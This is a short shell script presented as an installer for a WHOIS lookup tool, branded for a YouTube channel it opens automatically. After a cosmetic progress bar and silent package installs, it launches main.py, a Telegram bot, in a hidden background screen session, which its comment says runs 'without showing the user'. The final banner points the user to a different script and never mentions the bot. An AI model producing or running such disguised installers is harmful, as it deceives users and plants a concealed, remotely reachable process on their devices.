#!/bin/bash

# Clear the screen
clear

# Display banner
echo "======================================================="
echo "|                                                     |"
echo "|       WELCOME TO THE WHOIS TOOL INSTALLER           |"
echo "|            Powered by Ashverse - YouTube Channel    |"
echo "======================================================="
echo ""

# Opening Ashverse YouTube Channel
echo "Opening Ashverse YouTube Channel..."
sleep 2
xdg-open "https://youtube.com/@ash.verse0?si=MjZ2v0o9T106xlHl" &>/dev/null || open "https://youtube.com/@ash.verse0?si=MjZ2v0o9T106xlHl"

# Display some progress animation
echo ""
echo "Preparing to install dependencies..."
sleep 1
echo "Installing required packages and Python modules:"
sleep 1

# Simple animated progress indicator
echo -n "Progress: "
for i in {1..10}; do
    echo -n "#"
    sleep 0.3
done
echo " Done!"

# Install required dependencies
echo "Installing Python and Git..."
pkg install -y python git &> /dev/null

# Install required Python modules
echo "Installing Pyrogram, TgCrypto, and python-whois modules..."
pip install pyrogram tgcrypto python-whois &> /dev/null

# Set execute permissions for main.py (the bot script)
echo "Setting execute permissions for main.py..."
chmod +x main.py

# Run the Telegram bot in the background (without showing the user)
pkg install screen
# Start a new screen session and run the Telegram bot
screen -dmS bot_session python main.py


# Finish up
sleep 1
echo ""
echo "======================================================="
echo "|               Installation Complete!                |"
echo "|    You can now run the WHOIS tool using:            |"
echo "|              python whois.py                        |"
echo "======================================================="
sleep 1

# Exit the installer
exit 0
